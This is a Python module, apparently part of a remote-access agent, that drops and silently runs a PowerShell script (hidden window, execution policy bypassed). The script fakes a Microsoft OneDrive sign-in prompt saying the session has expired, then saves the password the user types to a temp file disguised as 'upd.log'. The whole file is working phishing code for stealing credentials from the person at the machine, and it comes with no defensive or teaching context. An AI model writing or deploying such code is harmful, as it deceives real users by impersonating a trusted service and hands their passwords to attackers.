"""
Agent phish module — credential harvesting lure on the target desktop.
T1598: Phishing for Information
"""
from __future__ import annotations

import subprocess
import tempfile
import os


_LURE_PS1 = """
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.Text = "Microsoft OneDrive — Sign in"
$form.Width = 400; $form.Height = 200; $form.StartPosition = "CenterScreen"
$label = New-Object Windows.Forms.Label
$label.Text = "Your session has expired. Please sign in again."
$label.SetBounds(10,10,370,20)
$passBox = New-Object Windows.Forms.MaskedTextBox
$passBox.PasswordChar = "*"; $passBox.SetBounds(10,40,370,20)
$btn = New-Object Windows.Forms.Button
$btn.Text = "Sign In"; $btn.SetBounds(150,80,100,30)
$btn.Add_Click({ $form.Close() })
$form.Controls.AddRange(@($label,$passBox,$btn))
[void]$form.ShowDialog()
$passBox.Text | Out-File "$env:TEMP\\upd.log" -Encoding utf8
"""


def run(task: dict) -> str:
    lure = task.get("lure", "login")
    if lure != "login":
        return f"unknown lure: {lure}"
    with tempfile.NamedTemporaryFile(suffix=".ps1", delete=False, mode="w") as f:
        f.write(_LURE_PS1)
        ps1 = f.name
    subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", ps1],
    )
    return "lure deployed"
